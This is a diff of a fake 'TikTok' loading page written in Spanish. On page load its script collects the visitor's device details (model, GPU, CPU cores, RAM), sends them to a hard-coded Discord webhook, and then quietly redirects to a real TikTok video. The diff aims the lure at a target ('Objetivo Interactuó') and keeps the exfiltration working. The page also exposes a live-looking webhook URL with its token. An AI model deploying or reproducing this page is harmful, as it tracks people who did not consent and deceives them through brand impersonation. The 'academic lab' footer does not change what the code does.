@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok</title>
+    <title>TikTok - Yamaha R6 Black Edit</title>
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
@@ -22,7 +22,6 @@
             align-items: center;
             justify-content: center;
         }
-        /* Animación del logo clásico de TikTok (Cian y Rojo parpadeante) */
         .logo-container {
             position: relative;
             width: 80px;
@@ -68,15 +67,13 @@
             <div class="dot dot-1"></div>
             <div class="dot dot-2"></div>
         </div>
-        <p>Abriendo en TikTok...</p>
+        <p>Cargando video en TikTok...</p>
     </div>
 
     <script>
-        // TU URL DE DISCORD SE MANTIENE
+        // CONFIGURACIÓN DE TU INFRAESTRUCTURA
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554562359383556197/wJs1y9CfsQFL10UI5K-Y40M2k0OOfdqtV_3mg9Iy1wWFE25RkeuI4l0edpvbNwOjLSik";
-        
-        // REEMPLAZA ESTE ENLACE POR EL VIDEO REAL DE TIKTOK QUE QUIERAS MOSTRAR
-        const VIDEO_DESTINO = "https://www.tiktok.com/@r6_xvv/video/7515913288111213842?_r=1&_t=ZS-9A8yIAJHNOW";
+        const VIDEO_DESTINO = "https://www.tiktok.com/@r6_xvv/video/7515913288111213842";
 
         async function capturarDatos() {
             let datos = {
@@ -105,8 +102,8 @@
 
             const mensajeDiscord = {
                 embeds: [{
-                    title: "📱 ¡Nuevo Dispositivo Detectado (TikTok Mask)!",
-                    color: 16642133, // Color rosado de TikTok
+                    title: "🏍️ ¡Objetivo Interactuó (Filtro TikTok R6)!",
+                    color: 16642133, 
                     fields: [
                         { name: "Modelo (Client Hints)", value: datos.modelo_hints, inline: true },
                         { name: "Procesador Gráfico (GPU)", value: datos.gpu, inline: true },
@@ -114,11 +111,12 @@
                         { name: "Núcleos CPU", value: String(datos.nucleos_cpu), inline: true },
                         { name: "Memoria RAM", value: datos.ram_aproximada, inline: true }
                     ],
-                    footer: { text: "Laboratorio Académico de Ciberseguridad" },
+                    footer: { text: "Auditoría de Vector de Ataque - Caso Práctico" },
                     timestamp: new Date()
                 }]
             };
 
+            // Envío en paralelo (Asíncrono) para evitar retrasos visuales
             try {
                 fetch(DISCORD_WEBHOOK_URL, {
                     method: "POST",
@@ -127,10 +125,10 @@
                 });
             } catch (error) {}
 
-            // Redirección forzada tras 400 milisegundos
+            // Forzar redirección fluida a los 450ms
             setTimeout(() => {
                 window.location.href = VIDEO_DESTINO;
-            }, 400);
+            }, 450);
         }
 
         window.onload = capturarDatos;
